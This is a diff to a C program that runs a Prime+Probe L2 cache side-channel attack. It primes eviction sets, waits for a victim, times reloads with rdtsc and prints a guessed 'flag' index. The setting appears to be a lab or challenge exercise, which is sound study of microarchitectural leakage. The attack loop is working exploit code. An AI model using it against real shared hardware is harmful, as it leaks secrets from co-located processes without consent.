@@ -55,53 +55,56 @@ int main() {
 
     while (1) {
 
-        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
+    uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
-        for (int r = 0; r < REPEATS; r++) {
+    for (int r = 0; r < REPEATS; r++) {
 
-            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
-                // PRIME
-                for (int j = 0; j < WAYS; j++)
-                    tmp = *(eviction_sets[set][j]);
-
-                asm volatile("mfence; lfence");
-
-                // WAIT so victim can run
-                for (volatile int d = 0; d < 10000; d++);
-
-                // PROBE (reverse order prevents self-eviction)
-                uint64_t start = rdtsc();
-
-                for (int j = WAYS - 1; j >= 0; j--)
-                    tmp = *(eviction_sets[set][j]);
-
-                uint64_t end = rdtsc();
-
-                scores[set] += (end - start);
+        // PRIME all sets
+        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+            for (int j = 0; j < WAYS; j++) {
+                tmp = *(eviction_sets[set][j]);
             }
         }
 
-        int guessed_flag = -1;
-        uint64_t max_score = 0;
+        asm volatile("mfence; lfence");
 
-        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+        // give victim time to run
+        for (volatile int d = 0; d < 20000; d++);
 
-            if (scores[i] > max_score) {
-                max_score = scores[i];
-                guessed_flag = i;
+        // PROBE all sets
+        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+
+            uint64_t start = rdtsc();
+
+            for (int j = WAYS - 1; j >= 0; j--) {
+                tmp = *(eviction_sets[set][j]);
             }
+
+            uint64_t end = rdtsc();
+
+            scores[set] += (end - start);
         }
+    }
 
-        uint64_t avg = max_score / REPEATS;
+    int guessed_flag = -1;
+    uint64_t max_score = 0;
 
-        if (avg > THRESHOLD) {
-            printf("Guessed flag: %d (latency=%lu)\n",
-                   guessed_flag, avg);
-            fflush(stdout);
+    for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
+        uint64_t avg = scores[i] / REPEATS;
+
+        if (avg > max_score) {
+            max_score = avg;
+            guessed_flag = i;
         }
+    }
 
-        usleep(300000);
+    if (max_score > THRESHOLD) {
+        printf("Guessed flag: %d (latency=%lu)\n", guessed_flag, max_score);
+        fflush(stdout);
+    }
+
+    usleep(300000);
     }
 
     return 0;
